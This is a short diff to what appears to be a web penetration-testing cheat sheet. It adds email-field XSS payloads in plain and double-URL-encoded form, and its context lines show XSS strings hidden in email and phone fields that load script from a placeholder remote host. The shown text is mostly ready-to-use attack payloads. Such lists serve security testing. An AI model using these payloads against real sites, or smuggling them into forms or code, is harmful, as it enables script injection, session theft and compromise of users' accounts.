@@ -127,6 +127,11 @@ window&&=(window&&=opener||=alert)?.(1??0,)
 Email: "><img/src/onerror=import('//domain/')>"@domain.com
 Mobile: 013371337;ext=<img/src/onerror=import('//domain/')>
 ```
+12-Email xss : 
+```
+test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E 
+test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E
+```
 # SSRF
 1-Try other URL schemes:<br>
 ```
